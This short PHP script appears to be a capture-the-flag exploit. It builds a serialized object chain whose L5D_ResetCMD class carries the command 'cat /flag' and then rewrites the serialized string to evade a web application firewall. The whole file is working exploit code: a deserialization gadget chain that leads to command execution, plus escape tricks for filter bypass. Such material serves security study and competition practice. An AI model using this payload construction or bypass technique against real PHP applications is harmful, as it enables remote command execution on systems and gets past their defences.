<?php

class L5D_Upload {
	public $x;
}

class L5D_ResetCMD {
	protected $new_cmd;
	public $x;
	function __construct($cmd) {
        $this -> new_cmd = $cmd;
    }
}

class L5D_Command {
	public $x;
}

class L5D_Login {}

$L5D_Login = new L5D_Login();

$L5D_Command = new L5D_Command();
$L5D_Command -> x = $L5D_Login;

$L5D_ResetCMD = new L5D_ResetCMD("cat /flag");
$L5D_ResetCMD -> x = $L5D_Command;

$L5D_Upload = new L5D_Upload();
$L5D_Upload -> x = $L5D_ResetCMD;


$data = serialize($L5D_Upload);

# To bypass waf
$data = str_replace('*', '\0\\\2a\0', $data);
$data = str_replace('s:10', 'S:10', $data);
echo $data;
# 'O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{s:10:"*new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":1:{s:1:"x";O:9:"L5D_Login":0:{}}}}
# 'O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{S:10:"\0\\2a\0new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":1:{s:1:"x";O:9:"L5D_Login":0:{}}}}

?>